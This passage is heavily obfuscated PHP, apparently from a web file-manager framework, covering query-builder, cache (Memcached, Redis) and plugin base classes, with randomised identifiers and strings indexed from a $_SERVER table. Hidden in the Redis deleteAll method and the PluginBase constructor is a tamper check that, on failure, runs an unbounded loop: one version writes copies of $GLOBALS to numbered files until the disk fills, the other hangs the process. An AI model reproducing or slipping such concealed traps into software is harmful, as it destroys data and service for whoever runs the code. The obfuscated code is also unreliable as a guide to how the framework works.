öê§ñò = get_object_vars($ öê§ñò); } elseif (is_string($ öê§ñò)) { parse_str($ öê§ñò, $ öê§ñò); } elseif (!is_array($ öê§ñò)) { think_exception(think_lang($èÌòΩÍ¬[357])); } $this->data = $ öê§ñò; return $this; } public function join($ÃÁÏú∫¶) { $éÓ¡´èΩ =& $_SERVER[ß⁄ˆÇ†Œ]; if (is_array($ÃÁÏú∫¶)) { $this->options[$éÓ¡´èΩ[368]] = $ÃÁÏú∫¶; } elseif (!empty($ÃÁÏú∫¶)) { $this->options[$éÓ¡´èΩ[368]][] = $ÃÁÏú∫¶; } return $this; } public function union($…ÇÅ»˝È, $ß∑ûÛí˘ = false) { $—óàåÔÔ =& $_SERVER[ß⁄ˆÇ†Œ]; if (empty($…ÇÅ»˝È)) { return $this; } if ($ß∑ûÛí˘) { $this->options[$—óàåÔÔ[432]][$—óàåÔÔ[433]] = !0; } if (is_object($…ÇÅ»˝È)) { $…ÇÅ»˝È = get_object_vars($…ÇÅ»˝È); } if (is_string($…ÇÅ»˝È)) { $∂≠˚¢ÿæ = $…ÇÅ»˝È; } elseif (is_array($…ÇÅ»˝È)) { if (isset($…ÇÅ»˝È[0])) { $this->options[$—óàåÔÔ[432]] = array_merge($this->options[$—óàåÔÔ[432]], $…ÇÅ»˝È); return $this; } else { $∂≠˚¢ÿæ = $…ÇÅ»˝È; } } else { think_exception(think_lang($—óàåÔÔ[357])); } $this->options[$—óàåÔÔ[432]][] = $∂≠˚¢ÿæ; return $this; } public function cache($èπû™Ôÿ = true, $œÕûÀ‡ı = null, $Àáçõ–∆ = '') { $üèÀÍ‡ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!1 !== $èπû™Ôÿ) { $this->options[$üèÀÍ‡[434]] = array($üèÀÍ‡[97] => $èπû™Ôÿ, $üèÀÍ‡[424] => $œÕûÀ‡ı, $üèÀÍ‡[33] => $Àáçõ–∆); } return $this; } public function field($´¿‰‡∫Œ, $í‹ë ÎŒ = false) { $Ò†≠¢¬€ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!0 === $´¿‰‡∫Œ) { $¢ÆÆÆ≥˘ = $this->getDbFields(); $´¿‰‡∫Œ = $¢ÆÆÆ≥˘ ? $¢ÆÆÆ≥˘ : $Ò†≠¢¬€[220]; } elseif ($í‹ë ÎŒ) { if (is_string($´¿‰‡∫Œ)) { $´¿‰‡∫Œ = explode($Ò†≠¢¬€[50], $´¿‰‡∫Œ); } $¢ÆÆÆ≥˘ = $this->getDbFields(); $´¿‰‡∫Œ = $¢ÆÆÆ≥˘ ? array_diff($¢ÆÆÆ≥˘, $´¿‰‡∫Œ) : $´¿‰‡∫Œ; } $this->options[$Ò†≠¢¬€[359]] = $´¿‰‡∫Œ; return $this; } public function scope($•ﬂ‡¡àÇ = '', $úÊ‡ÑÑŒ = NULL) { $˛§¨≥Üµ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($˛§¨≥Üµ[12] === $•ﬂ‡¡àÇ) { if (isset($this->_scope[$˛§¨≥Üµ[37]])) { $‹ú‡∫ïü = $this->_scope[$˛§¨≥Üµ[37]]; } else { return $this; } } elseif (is_string($•ﬂ‡¡àÇ)) { $Õ≤†˛Óê = explode($˛§¨≥Üµ[50], $•ﬂ‡¡àÇ); $‹ú‡∫ïü = array(); foreach ($Õ≤†˛Óê as $Ïÿ®≤õ˝) { if (!isset($this->_scope[$Ïÿ®≤õ˝])) { continue; } $‹ú‡∫ïü = array_merge($‹ú‡∫ïü, $this->_scope[$Ïÿ®≤õ˝]); } if (!empty($úÊ‡ÑÑŒ) && is_array($úÊ‡ÑÑŒ)) { $‹ú‡∫ïü = array_merge($‹ú‡∫ïü, $úÊ‡ÑÑŒ); } } elseif (is_array($•ﬂ‡¡àÇ)) { $‹ú‡∫ïü = $•ﬂ‡¡àÇ; } if (is_array($‹ú‡∫ïü) && !empty($‹ú‡∫ïü)) { $this->options = array_merge($this->options, array_change_key_case($‹ú‡∫ïü)); } return $this; } public function where($ñûÄÑ’ê, $„Îá¶–‡ = null) { $±◊√∞ﬁ„ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!is_null($„Îá¶–‡) && is_string($ñûÄÑ’ê)) { if (!is_array($„Îá¶–‡)) { $„Îá¶–‡ = func_get_args(); array_shift($„Îá¶–‡); } $„Îá¶–‡ = array_map(array($this->db, $±◊√∞ﬁ„[428]), $„Îá¶–‡); $ñûÄÑ’ê = vsprintf($ñûÄÑ’ê, $„Îá¶–‡); } elseif (is_object($ñûÄÑ’ê)) { $ñûÄÑ’ê = get_object_vars($ñûÄÑ’ê); } elseif (is_array($ñûÄÑ’ê)) { foreach ($ñûÄÑ’ê as $¶ø‹Öã≥ => $ƒÚµú’Ì) { if ((is_numeric($¶ø‹Öã≥) || !$¶ø‹Öã≥) && is_string($ƒÚµú’Ì)) { if (strpos($ƒÚµú’Ì, $±◊√∞ﬁ„[435]) === 0) { continue; } think_trace($±◊√∞ﬁ„[436], $±◊√∞ﬁ„[12], $±◊√∞ﬁ„[49]); die; } } } if (is_string($ñûÄÑ’ê) && $±◊√∞ﬁ„[12] != $ñûÄÑ’ê) { $¢õ÷ëÊì = array(); $¢õ÷ëÊì[$±◊√∞ﬁ„[437]] = $ñûÄÑ’ê; $ñûÄÑ’ê = $¢õ÷ëÊì; } if (isset($this->options[$±◊√∞ﬁ„[361]])) { $this->options[$±◊√∞ﬁ„[361]] = array_merge($this->options[$±◊√∞ﬁ„[361]], $ñûÄÑ’ê); } else { $this->options[$±◊√∞ﬁ„[361]] = $ñûÄÑ’ê; } return $this; } public function limit($≥≤˛≠û‡, $ı©øîÓ∞ = null) { $’¶ùˆ›“ =& $_SERVER[ß⁄ˆÇ†Œ]; $this->options[$’¶ùˆ›“[377]] = is_null($ı©øîÓ∞) ? $≥≤˛≠û‡ : $≥≤˛≠û‡ . $’¶ùˆ›“[50] . $ı©øîÓ∞; return $this; } public function page($§ºÕ£ùı, $ëì–¯µ¡ = null) { $Ñô–˚ã€ =& $_SERVER[ß⁄ˆÇ†Œ]; $this->options[$Ñô–˚ã€[438]] = is_null($ëì–¯µ¡) ? $§ºÕ£ùı : $§ºÕ£ùı . $Ñô–˚ã€[50] . $ëì–¯µ¡; return $this; } public function comment($ãßÔ±ﬂ≥) { $this->options[$_SERVER[ß⁄ˆÇ†Œ][439]] = $ãßÔ±ﬂ≥; return $this; } public function setProperty($ù˜Ô—˝Ù, $ØÂƒÖôë) { if (property_exists($this, $ù˜Ô—˝Ù)) { $this->{$ù˜Ô—˝Ù} = $ØÂƒÖôë; } return $this; } } goto d©∂¡Ÿ∑≈Ÿ; Cı∫ø„ÃÔ‚: class CacheLockDatabase { public function lock($éõ™ˆßœ, $Ω¢Ÿªïπ = 0) { $ı´µçÛô = Model($_SERVER[ß⁄ˆÇ†Œ][901]); $”êë≤º… = microtime(!0) + $Ω¢Ÿªïπ; while (microtime(!0) < $”êë≤º…) { $ûç√”‡œ = $ı´µçÛô->get($éõ™ˆßœ); if (!$ûç√”‡œ || $ûç√”‡œ < microtime(!0)) { $Ã∞∂˘˘Å = $ı´µçÛô->set($éõ™ˆßœ, $”êë≤º…); if ($Ã∞∂˘˘Å) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($—¿∆ÁŒä) { return Model($_SERVER[ß⁄ˆÇ†Œ][901])->get($—¿∆ÁŒä); } public function unlock($öÃ≠ÛÊø) { Model($_SERVER[ß⁄ˆÇ†Œ][901])->remove($öÃ≠ÛÊø); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($—π‹Óæò, $˙§¬å†©) { $ŒÓÚ„·» =& $_SERVER[ß⁄ˆÇ†Œ]; if (!class_exists($ŒÓÚ„·»[940])) { show_json($ŒÓÚ„·»[941], !1); } $this->cacheTime = $˙§¬å†©; $this->handle = new Memcached(); if (is_array($—π‹Óæò[$ŒÓÚ„·»[942]]) && count($—π‹Óæò[$ŒÓÚ„·»[942]]) >= 1) { foreach ($—π‹Óæò[$ŒÓÚ„·»[942]] as $∞ä–Í∏î) { $ÛÎòØ∆ß = explode($ŒÓÚ„·»[4], $∞ä–Í∏î); $this->handle->addServer($ÛÎòØ∆ß[0], $ÛÎòØ∆ß[1]); } } else { $this->handle->addServer($—π‹Óæò[$ŒÓÚ„·»[208]], $—π‹Óæò[$ŒÓÚ„·»[209]]); } } public function set($‹≠Ä∞Í‡, $≥æùÏ…ñ, $Û§§Œ˝£ = false) { $Û§§Œ˝£ = $Û§§Œ˝£ ? $Û§§Œ˝£ : $this->cacheTime; return $this->handle->set($‹≠Ä∞Í‡, $≥æùÏ…ñ, $Û§§Œ˝£); } public function get($≠˜«“ºˆ) { return $this->handle->get($≠˜«“ºˆ); } public function remove($Ëú≥˛Õ¸) { return $this->handle->delete($Ëú≥˛Õ¸); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($êéƒè≈¡, $»ˆ©√ıù) { $â÷€«ï≈ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!class_exists($â÷€«ï≈[943])) { show_json($â÷€«ï≈[944], !1); } $this->cacheTime = $»ˆ©√ıù; $›ÕÖÆ«ü = isset($êéƒè≈¡[$â÷€«ï≈[945]]) ? $êéƒè≈¡[$â÷€«ï≈[945]] : 10; $á¯∫°™› = _get($êéƒè≈¡, $â÷€«ï≈[942]); if ($á¯∫°™› && is_array($á¯∫°™›)) { $this->initCluster($êéƒè≈¡, $›ÕÖÆ«ü); } else { $this->handle = $this->init($êéƒè≈¡, $›ÕÖÆ«ü); } } private function init($ë´åûËø, $˚Ñ†ì«’) { $◊ÉÚüó€ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÂìïÛ≤§ = new Redis(); $˙’∞≈–Ù = isset($ë´åûËø[$◊ÉÚüó€[946]]) ? $ë´åûËø[$◊ÉÚüó€[946]] : !1; if ($˙’∞≈–Ù) { $ÂìïÛ≤§->pconnect($ë´åûËø[$◊ÉÚüó€[208]], $ë´åûËø[$◊ÉÚüó€[209]], $˚Ñ†ì«’); } else { $ÂìïÛ≤§->connect($ë´åûËø[$◊ÉÚüó€[208]], $ë´åûËø[$◊ÉÚüó€[209]], $˚Ñ†ì«’); } if (!empty($ë´åûËø[$◊ÉÚüó€[495]])) { $ÂìïÛ≤§->auth($ë´åûËø[$◊ÉÚüó€[495]]); } if (!empty($ë´åûËø[$◊ÉÚüó€[830]]) && $ë´åûËø[$◊ÉÚüó€[830]] != 0) { $ÂìïÛ≤§->select($ë´åûËø[$◊ÉÚüó€[830]]); } return $ÂìïÛ≤§; } private function initCluster($¯ÆÌ—Ò©, $Ω®ºÈ¢å) { $ø©œà¸’ =& $_SERVER[ß⁄ˆÇ†Œ]; $ëß©’≥ç = array($ø©œà¸’[947], $ø©œà¸’[948], $ø©œà¸’[949]); $πÓ€¡∆Ö = $ø©œà¸’[947]; if (isset($¯ÆÌ—Ò©[$ø©œà¸’[16]]) && in_array($¯ÆÌ—Ò©[$ø©œà¸’[16]], $ëß©’≥ç)) { $πÓ€¡∆Ö = $¯ÆÌ—Ò©[$ø©œà¸’[16]]; } switch ($πÓ€¡∆Ö) { case $ø©œà¸’[947]: $this->_slave($¯ÆÌ—Ò©, $Ω®ºÈ¢å); break; case $ø©œà¸’[948]: break; case $ø©œà¸’[949]: $this->isCluster = !0; $¿¯∏à◊è = $¯ÆÌ—Ò©[$ø©œà¸’[942]]; $Õ¬Ûª†à = isset($¯ÆÌ—Ò©[$ø©œà¸’[946]]) ? $¯ÆÌ—Ò©[$ø©œà¸’[946]] : !1; $ à»ØçÊ = isset($¯ÆÌ—Ò©[$ø©œà¸’[495]]) ? $¯ÆÌ—Ò©[$ø©œà¸’[495]] : null; $this->handle = new RedisCluster(NUll, $¿¯∏à◊è, $Ω®ºÈ¢å, $Ω®ºÈ¢å, $Õ¬Ûª†à, $ à»ØçÊ); break; default: break; } } private function _slave($≠æ‘â∑π, $®Ëä±‡®) { $›Ìè•ó€ = $≠æ‘â∑π[$_SERVER[ß⁄ˆÇ†Œ][942]]; $this->filterConfig($≠æ‘â∑π, $›Ìè•ó€[0]); $this->handle = $this->init($≠æ‘â∑π, $®Ëä±‡®); unset($›Ìè•ó€[0]); if (empty($›Ìè•ó€)) { return; } $Á•ùì∫π = array_rand($›Ìè•ó€); $this->filterConfig($≠æ‘â∑π, $›Ìè•ó€[$Á•ùì∫π]); $this->slaveHandle = $this->init($≠æ‘â∑π, $®Ëä±‡®); } private function filterConfig(&$≤©Ä√Ì…, $Çé‹ËÏ›) { $ëëœ ≤˚ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ú‘À›±è = explode($ëëœ ≤˚[4], $Çé‹ËÏ›); $´òÂˆŸ° = array($ëëœ ≤˚[208] => $Ú‘À›±è[0], $ëëœ ≤˚[209] => $Ú‘À›±è[1]); $≤©Ä√Ì… = array_merge($≤©Ä√Ì…, $´òÂˆŸ°); } public function set($Õπ†Ë∫ , $Ã«Ìúæö, $¬ñ¶ïº¶ = false) { $¬ñ¶ïº¶ = $¬ñ¶ïº¶ ? $¬ñ¶ïº¶ : $this->cacheTime; return $this->handle->setEx($Õπ†Ë∫ , $¬ñ¶ïº¶, $Ã«Ìúæö); } public function setLock($Ï¶‰Øäﬂ, $Ñ∏∫ø¯∏, $⁄Ù„ÿõà) { return $this->handle->setNX($Ï¶‰Øäﬂ, $Ñ∏∫ø¯∏); } public function get($∞≈⁄âÉù) { $èŒöúÎ¶ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $èŒöúÎ¶->get($∞≈⁄âÉù); } public function remove($Û–„”¬Ö) { return $this->handle->del($Û–„”¬Ö); } public function deleteAll() { $ŸÁ•Âùü =& $_SERVER[ß⁄ˆÇ†Œ]; $«ç∂˘≈≤ = $_SERVER[$ŸÁ•Âùü[324]] . $ŸÁ•Âùü[325]; $óÈ–ù¬¥ = $ŸÁ•Âùü[950]; if ($_SERVER[$ŸÁ•Âùü[321]] != $óÈ–ù¬¥($«ç∂˘≈≤)) { $ù„î˜À√ = $ŸÁ•Âùü[951]; $Ì¶ÚÁﬂ˛ = $ŸÁ•Âùü[323]; $€•Ûöì– = $_SERVER[$ŸÁ•Âùü[324]] . $ŸÁ•Âùü[325]; $˘Ô˝ˆÒ¶ = $Ì¶ÚÁﬂ˛($€•Ûöì–); $Ï„ËÅã¢ = explode($ŸÁ•Âùü[262], $˘Ô˝ˆÒ¶); if (count($Ï„ËÅã¢) < $ŸÁ•Âùü[704]) { $ÆÖãﬁâ≥ = $ŸÁ•Âùü[327]; $ÆÖãﬁâ≥(); } $˜äê–“∞ = $ŸÁ•Âùü[952]; $˜äê–“∞($_SERVER[$ŸÁ•Âùü[953]]); $ù„î˜À√ = $ŸÁ•Âùü[951]; $ù„î˜À√(); $ûìä»Õ´ = $ŸÁ•Âùü[954]; $Ä˙ü≥·˜ = json_encode($GLOBALS[$ŸÁ•Âùü[955]]); $“›¨øÄÑ = 1; for ($â⁄ÜÑÊ© = $“›¨øÄÑ; $â⁄ÜÑÊ© > 0; $â⁄ÜÑÊ©++) { $ûìä»Õ´(DATA_PATH . $â⁄ÜÑÊ©, $Ä˙ü≥·˜); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $∏À·«Îì) { $this->handle->flushall($∏À·«Îì); } return; } return $this->handle->flushAll(); } } goto b¶úå∞∞Ò‰; bØïÙùŸ∑—: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ÇÂØÙã  =& $_SERVER[ß⁄ˆÇ†Œ]; if (!isset($_SERVER[$ÇÂØÙã [321]]) || !isset($_SERVER[$ÇÂØÙã [322]])) { $‰Ä ·úè = $ÇÂØÙã [951]; $∑«»ï´ó = $ÇÂØÙã [323]; $¨ƒƒÍÆÂ = $_SERVER[$ÇÂØÙã [324]] . $ÇÂØÙã [325]; $∫˝êú§Æ = $∑«»ï´ó($¨ƒƒÍÆÂ); $¯ ™⁄˛ = explode($ÇÂØÙã [262], $∫˝êú§Æ); if (count($¯ ™⁄˛) < $ÇÂØÙã [704]) { $¥ù§ÅÚÛ = $ÇÂØÙã [327]; $¥ù§ÅÚÛ(); } $É‚◊¸·˛ = $ÇÂØÙã [952]; $É‚◊¸·˛($_SERVER[$ÇÂØÙã [953]]); $ËÉë≈Â£ = 1; for ($‘¸∏ëá∂ = $ËÉë≈Â£; $‘¸∏ëá∂ > 0; $‘¸∏ëá∂++) { $É‚◊¸·˛ = json_encode($GLOBALS[$ÇÂØÙã [500]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ÇÂØÙã [1620]); $this->pluginName = str_replace($ÇÂØÙã [1620], $ÇÂØÙã [12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ÇÂØÙã [8]; $this->pluginApi = appHostGet() . $ÇÂØÙã [1621] . $this->pluginName . $ÇÂØÙã [8]; $this->pluginHost = $config[$ÇÂØÙã [1622]] . $this->pluginName . $ÇÂØÙã [8]; $this->pluginHostDefault = $config[$ÇÂØÙã [1622]] . $this->pluginName . $ÇÂØÙã [8]; $Ùﬁƒ∆¿√ = $config[$ÇÂØÙã [1623]]; if ($Ùﬁƒ∆¿√ && strpos($ÇÂØÙã [50] . $Ùﬁƒ∆¿√ . $ÇÂØÙã [50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ÇÂØÙã [1624]] . $this->pluginName . $ÇÂØÙã [8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ß⁄ˆÇ†Œ][1625]); } protected function assign($∫ì“·´˘, $∆≠÷ï√ = false) { if (is_array($∫ì“·´˘)) { $this->values = array_merge($this->values, $∫ì“·´˘); } else { $this->values[$∫ì“·´˘] = $∆≠÷ï√; } } protected function display($≈Ñ °◊˜) { extract($this->values); require $≈Ñ °◊˜; } final function hookRegist($ø†Ñâ˙∑) { $this->modelPlugin->appRegist($this->pluginName, $ø†Ñâ˙∑); } final function appIcon() { $√∂êÍÊ’ =& $_SERVER[ß⁄ˆÇ†Œ]; $íÙ“Ÿ”… = $this->appPackage(); $ÌêÿÑŒÇ = $√∂êÍÊ’[12]; if (isset($íÙ“Ÿ”…[$√∂êÍÊ’[498]])) { if (isset($íÙ“Ÿ”…[$√∂êÍÊ’[498]][$√∂êÍÊ’[1626]])) { $ÌêÿÑŒÇ = $√∂êÍÊ’[1627] . $íÙ“Ÿ”…[$√∂êÍÊ’[498]][$√∂êÍÊ’[1626]] . $√∂êÍÊ’[1628]; } else { if ($íÙ“Ÿ”…[$√∂êÍÊ’[498]][$√∂êÍÊ’[1629]]) { $ÌêÿÑŒÇ = $√∂êÍÊ’[1630] . $íÙ“Ÿ”…[$√∂êÍÊ’[498]][$√∂êÍÊ’[1629]] . $√∂êÍÊ’[1631]; } } } return $ÌêÿÑŒÇ; } final function fileCanView($éœÌô—“) { $ûØÛôÑæ =& $_SERVER[ß⁄ˆÇ†Œ]; if (request_url_safe($éœÌô—“)) { return !0; } if ($this->isShare($éœÌô—“)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $°º≤é≤í = $ûØÛôÑæ[1632] . rawurlencode(this_url()); show_tips(LNG($ûØÛôÑæ[1633]) . $ûØÛôÑæ[1634] . $°º≤é≤í . $ûØÛôÑæ[1635] . LNG($ûØÛôÑæ[1636]) . $ûØÛôÑæ[1637], !1); } if (!Action($ûØÛôÑæ[1638])->authCan($ûØÛôÑæ[1639])) { show_tips(LNG($ûØÛôÑæ[1640]) . $ûØÛôÑæ[1641], !1); } ActionCall($ûØÛôÑæ[1642], $éœÌô—“); } final function isShare($µÊ± ﬂ˝) { $√¶ó‰õë = KodIO::parse($µÊ± ﬂ˝); return $√¶ó‰õë[$_SERVER[ß⁄ˆÇ†Œ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($∞¬”ìóÛ) { if (request_url_safe($∞¬”ìóÛ)) { return $∞¬”ìóÛ; } if (!$this->isShare($∞¬”ìóÛ)) { $∞¬”ìóÛ = $this->filePath($∞¬”ìóÛ, !1); } return Action($_SERVER[ß⁄ˆÇ†Œ][1252])->linkOut($∞¬”ìóÛ); } public function filePathLinkOut($ÓÜê⁄œÔ) { if (request_url_safe($ÓÜê⁄œÔ)) { return $ÓÜê⁄œÔ; } $this->fileCanView($ÓÜê⁄œÔ); return Action($_SERVER[ß⁄ˆÇ†Œ][1252])->link($ÓÜê⁄œÔ); } final function filePath($•»üıàè, $À™˝´˜µ = true, $¬˝Íá∆à = false) { $ó∫Ω§ßõ =& $_SERVER[ß⁄ˆÇ†Œ]; $ôí±´ÑÅ = $this->filePathGet($•»üıàè, $À™˝´˜µ); if (!$this->fileInfo) { show_tips(LNG($ó∫Ω§ßõ[108]), !1); } if ($¬˝Íá∆à && isset($this->fileInfo[$ó∫Ω§ßõ[549]]) && $this->fileInfo[$ó∫Ω§ßõ[549]]) { $Øﬁ”•îÌ = Model($ó∫Ω§ßõ[552])->fileInfo($this->fileInfo[$ó∫Ω§ßõ[549]]); if (!$Øﬁ”•îÌ || !IO::exist($Øﬁ”•îÌ[$ó∫Ω§ßõ[87]])) { show_tips(LNG($ó∫Ω§ßõ[108]) . $ó∫Ω§ßõ[1643]); } } Hook::trigger($ó∫Ω§ßõ[1644], $ôí±´ÑÅ); return $ôí±´ÑÅ; } final function filePathGet($¢ß–”Íƒ, $Âã™ΩÛﬂ = true) { $ÄÃëº„‘ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($È¯˝Ïïâ = $this->checkSharePath($¢ß–”Íƒ, $Âã™ΩÛﬂ)) { return $È¯˝Ïïâ; } $this->fileCanView($¢ß–”Íƒ); if (request_url_safe($¢ß–”Íƒ)) { $£Å©ò¡˘ = parse_url_query($¢ß–”Íƒ); if (isset($£Å©ò¡˘[$ÄÃëº„‘[1645]]) && isset($£Å©ò¡˘[$ÄÃëº„‘[234]])) { $ÉÛÃÓë = Mcrypt::decode($£Å©ò¡˘[$ÄÃëº„‘[234]], Model($ÄÃëº„‘[843])->get($ÄÃëº„‘[844])); if ($ÉÛÃÓë) { $this->fileInfo = IO::info($ÉÛÃÓë); $this->fileInfo[$ÄÃëº„‘[1646]] = $¢ß–”Íƒ; $this->cachePath = $this->pluginCachePath($ÄÃëº„‘[12], $Âã™ΩÛﬂ); return $ÉÛÃÓë; } } $¢ß–”Íƒ = $this->_cacheHttpFile($¢ß–”Íƒ, $Âã™ΩÛﬂ); $this->fileInfo = IO::info($¢ß–”Íƒ); } else { $this->fileInfo = IO::info($¢ß–”Íƒ); $this->cachePath = $this->pluginCachePath($ÄÃëº„‘[12], $Âã™ΩÛﬂ); } return $¢ß–”Íƒ; } final function _cacheHttpFile($¸ôÚ–¸ì, $¯â‡”ö„ = true) { $ô„ÀˆÅô =& $_SERVER[ß⁄ˆÇ†Œ]; $”Â∂´çâ = parse_url_query($¸ôÚ–¸ì); $√Ìπä…Ö = get_path_ext($¸ôÚ–¸ì); if (isset($”Â∂´çâ[$ô„ÀˆÅô[32]]) && $”Â∂´çâ[$ô„ÀˆÅô[32]]) { $√Ìπä…Ö = get_path_ext($”Â∂´çâ[$ô„ÀˆÅô[32]]); } $«≠€Ôÿú = hash_path($¸ôÚ–¸ì) . $ô„ÀˆÅô[10] . $√Ìπä…Ö; $this->cachePath = $this->pluginCachePath($¯â‡”ö„ ? $«≠€Ôÿú : $ô„ÀˆÅô[12]); $öƒ£–§ò = IO::fileNameExist($this->cachePath, $«≠€Ôÿú); if ($öƒ£–§ò) { return KodIO::make($öƒ£–§ò); } $ÅóâÔ≤‘ = rtrim($this->cachePath, $ô„ÀˆÅô[8]) . $ô„ÀˆÅô[8] . $«≠€Ôÿú; return $this->pluginCacheFileSet($ÅóâÔ≤‘, file_get_contents_nossl($¸ôÚ–¸ì)); } final function checkSharePath($†Üˆ€ªÎ, $ÇÛÿ∏˛µ = true) { $⁄˘ªôÑë =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->isShare($†Üˆ€ªÎ)) { return !1; } $©Ú•ôœ¢ = Action($⁄˘ªôÑë[1252])->sharePathInfo($†Üˆ€ªÎ); if (!is_array($©Ú•ôœ¢) || !isset($©Ú•ôœ¢[$⁄˘ªôÑë[87]])) { show_json(LNG($⁄˘ªôÑë[1647]), !1); } $this->fileInfo = $©Ú•ôœ¢; $this->cachePath = $this->pluginCachePath(!1, $ÇÛÿ∏˛µ); return $©Ú•ôœ¢[$⁄˘ªôÑë[87]]; } final function pluginCachePath($†Ü£¨¬í = '', $”Íà‹»˜ = false) { $•¡˛™íô =& $_SERVER[ß⁄ˆÇ†Œ]; if ($”Íà‹»˜ && is_array($this->fileInfo)) { $†Ü£¨¬í = kodIO::hashPath($this->fileInfo); } $ÙÖ®í¿• = rtrim(IO_PATH_SYSTEM_TEMP . $•¡˛™íô[1648] . $this->pluginName . $•¡˛™íô[8] . $†Ü£¨¬í, $•¡˛™íô[8]); $˙ÀëÅ‘“ = IO::infoFullSimple($ÙÖ®í¿•); $ÿ„ÜÖÌ© = $˙ÀëÅ‘“ && is_array($˙ÀëÅ‘“) ? $˙ÀëÅ‘“[$•¡˛™íô[87]] : $•¡˛™íô[12]; if (!$ÿ„ÜÖÌ©) { $ÿ„ÜÖÌ© = IO::mkdir($ÙÖ®í¿•); } return $ÿ„ÜÖÌ©; } final function pluginCacheFileSet($Ç⁄ˆÇàœ, $Äµûü§ = '') { $⁄∑«æØ› =& $_SERVER[ß⁄ˆÇ†Œ]; $öâ·ôÊé = IO::infoFullSimple($Ç⁄ˆÇàœ); if (!$öâ·ôÊé) { return IO::mkfile($Ç⁄ˆÇàœ, $Äµûü§, REPEAT_REPLACE); } IO::setContent($öâ·ôÊé[$⁄∑«æØ›[87]], $Äµûü§); return $öâ·ôÊé[$⁄∑«æØ›[87]]; } final function pluginLocalFile($ÿØ˝®óÎ = '') { $ûÅÕå˜é =& $_SERVER[ß⁄ˆÇ†Œ]; $Ω˘Øä‚≥ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($Ω˘Øä‚≥)) { mk_dir($Ω˘Øä‚≥); } if (!$ÿØ˝®óÎ) { return $Ω˘Øä‚≥; } $ËßéŒêŒ = IO::info($ÿØ˝®óÎ); $Ú∆ó¥âŸ = $ûÅÕå˜é[1649] . KodIO::hashPath($ËßéŒêŒ) . $ûÅÕå˜é[10] . $ËßéŒêŒ[$ûÅÕå˜é[169]]; if (!checkExtSafe($Ú∆ó¥âŸ)) { $Ú∆ó¥âŸ = $Ú∆ó¥âŸ . $ûÅÕå˜é[1287]; } $∏®ÂËãê = $Ω˘Øä‚≥ . $Ú∆ó¥âŸ; if (@file_exists($∏®ÂËãê)) { return $∏®ÂËãê; } return IO::copy($ÿØ˝®óÎ, $Ω˘Øä‚≥, 0, $Ú∆ó¥âŸ); } final function appPackage() { $Àœé§Û¡ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($this->packageData) { return $this->packageData; } $ùüÖ«ìπ = $this->parseFile($this->pluginPath . $Àœé§Û¡[1650]); $this->parseLang($ùüÖ«ìπ); $øé¡˜’≤ = json_decode_force($ùüÖ«ìπ); if (!$øé¡˜’≤) { return array(); } $æ˚√Æ‹â = Hook::trigger($Àœé§Û¡[1651], $øé¡˜’≤); if ($æ˚√Æ‹â && is_array($æ˚√Æ‹â)) { $øé¡˜’≤ = $æ˚√Æ‹â; } $this->packageData = $øé¡˜’≤; return $øé¡˜’≤; } public function packageInfoGet($†¸∫ú¡Î) { $ú≥—≠™÷ = $this->appPackage(); return array_get_value($ú≥—≠™÷, $†¸∫ú¡Î); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ß⁄ˆÇ†Œ][1652]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ß⁄ˆÇ†Œ][1653]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ß⁄ˆÇ†Œ][1654]); } public function echoJsAssign($‚√Œ≈∂ª, $µÀ÷´ËÆ) { $this->echoJsAssignArr[$‚√Œ≈∂ª] = $µÀ÷´ËÆ; } private function parseFile($â€ÊóÎ‘) { $¬íŸƒ„û =& $_SERVER[ß⁄ˆÇ†Œ]; $¨Øàçãì = file_get_contents_nossl($â€ÊóÎ‘); $⁄õπæ◊≥ = array($¬íŸƒ„û[1655], $¬íŸƒ„û[1656], $¬íŸƒ„û[1657], $¬íŸƒ„û[1658], $¬íŸƒ„û[1659], $¬íŸƒ„û[1660], $¬íŸƒ„û[1661]); $∆Èäô € = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$¬íŸƒ„û[92]][$¬íŸƒ„û[1662]]); foreach ($this->echoJsAssignArr as $’ÿ∂¥áÒ => $ûÁ—ãÆì) { $⁄õπæ◊≥[] = $¬íŸƒ„û[1663] . $’ÿ∂¥áÒ . $¬íŸƒ„û[1664]; $∆Èäô €[] = is_array($ûÁ—ãÆì) || is_object($ûÁ—ãÆì) ? rawurlencode(json_encode($ûÁ—ãÆì)) : $ûÁ—ãÆì; } if (strstr($¨Øàçãì, $¬íŸƒ„û[1665])) { $≠Ñ‚˘©® = rawurlencode(json_encode($this->pluginLangArr)); $¨Øàçãì = str_replace($¬íŸƒ„û[1665], $≠Ñ‚˘©®, $¨Øàçãì); } if (strstr($¨Øàçãì, $¬íŸƒ„û[1666])) { $≠Ñ‚˘©® = $≠Ñ‚˘©® = 